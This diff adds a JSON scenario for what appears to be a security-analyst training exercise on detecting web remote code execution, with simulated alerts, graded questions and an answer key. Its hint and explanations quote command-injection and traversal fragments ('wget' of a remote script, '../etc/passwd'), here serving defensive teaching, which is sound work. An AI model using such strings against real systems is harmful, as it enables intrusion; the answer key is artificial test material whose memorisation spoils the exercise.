@@ -1,0 +1,60 @@
+{
+  "id": "web-rce-attempt",
+  "title": "Web RCE / Command Injection",
+  "difficulty": "advanced",
+  "duration_min": 20,
+  "briefing": "A single external source is sending $TARGET web requests that go beyond ordinary probing: command-injection strings and path traversal aimed at running code and reading files, and the server is answering 200. Decide whether this is remote code execution being attempted, whether it may have succeeded, and how urgently to act.",
+  "dashboard_hint": "Discover -> rule.id: 31106 on agent.name: $TARGET. Read data.url carefully: ';wget http://.../x.sh' is command injection pulling a payload; '../../../../etc/passwd' is file read. A 200 response means the app served it.",
+  "randomize": {
+    "ips": {"SRC1": "webattack"},
+    "targets": {"TARGET": {"question": "target"}}
+  },
+  "inject": {
+    "steps": [
+      {"template": "web_cmdinj",    "agent": "$TARGET", "srcips": ["$SRC1"], "count": [4, 7], "spacing": [1.5, 4.0]},
+      {"template": "web_traversal", "agent": "$TARGET", "srcips": ["$SRC1"], "count": [3, 5], "spacing": [1.5, 4.0]},
+      {"template": "web_cmdinj",    "agent": "$TARGET", "srcips": ["$SRC1"], "count": [2, 4], "spacing": [2.0, 5.0]}
+    ]
+  },
+  "ground_truth": {
+    "attack_type": "Web attack",
+    "target": "$TARGET",
+    "mitre": "T1190",
+    "severity": "Critical"
+  },
+  "questions": [
+    {"id": "srcips", "type": "ipset", "weight": 2,
+     "prompt": "Attacking source IP?",
+     "answer": ["$SRC1"],
+     "explain": "One external IP ($SRC1) sent all the RCE / traversal requests."},
+    {"id": "type", "type": "choice", "weight": 1,
+     "prompt": "What is the attacker attempting?",
+     "options": ["Remote code execution / command injection", "Credential brute force", "Simple port scan", "Denial of service"],
+     "answer": "Remote code execution / command injection",
+     "explain": "';wget http://.../x.sh' executes a command that pulls a payload — attempted RCE, not mere scanning."},
+    {"id": "techniques", "type": "multi", "weight": 2,
+     "prompt": "Which techniques appear in the requests? (select all)",
+     "options": ["Command injection", "Path/directory traversal", "Second-stage payload retrieval (wget/curl)", "SQL injection", "Cross-site scripting"],
+     "answer": ["Command injection", "Path/directory traversal", "Second-stage payload retrieval (wget/curl)"],
+     "explain": "cmd injection + '../../etc/passwd' traversal + a wget of a remote .sh payload. No SQLi/XSS in this one."},
+    {"id": "success", "type": "choice", "weight": 1,
+     "prompt": "The alerts show HTTP 200. What should you assume?",
+     "options": ["Safe — 200 means normal traffic", "The server served the malicious requests; treat the host as possibly compromised", "The attack was blocked by the WAF", "Nothing can be concluded"],
+     "answer": "The server served the malicious requests; treat the host as possibly compromised",
+     "explain": "200 on an injection request means it was served — assume possible code execution until proven otherwise."},
+    {"id": "target", "type": "choice", "weight": 1,
+     "prompt": "Targeted host?",
+     "options": ["$TARGET"],
+     "answer": "$TARGET",
+     "explain": "agent.name on the 31106 alerts is $TARGET."},
+    {"id": "mitre", "type": "text", "weight": 1,
+     "prompt": "Best-fit MITRE ATT&CK technique ID?",
+     "answer": ["T1190", "T1059"],
+     "explain": "T1190 Exploit Public-Facing Application (command execution via the web app; T1059 Command and Scripting Interpreter also fits)."},
+    {"id": "containment", "type": "multi", "weight": 2,
+     "prompt": "Immediate response (select all that apply):",
+     "options": ["Isolate / snapshot the host for IR", "Block the source IP", "Hunt for the pulled payload + outbound connections to the attacker", "Virtual-patch / WAF the vulnerable endpoint", "Wait and see if more alerts arrive"],
+     "answer": ["Isolate / snapshot the host for IR", "Block the source IP", "Hunt for the pulled payload + outbound connections to the attacker", "Virtual-patch / WAF the vulnerable endpoint"],
+     "explain": "Possible RCE with 200s = treat as compromise: isolate, block, hunt for the payload/C2, virtual-patch. 'Wait and see' loses the host."}
+  ]
+}
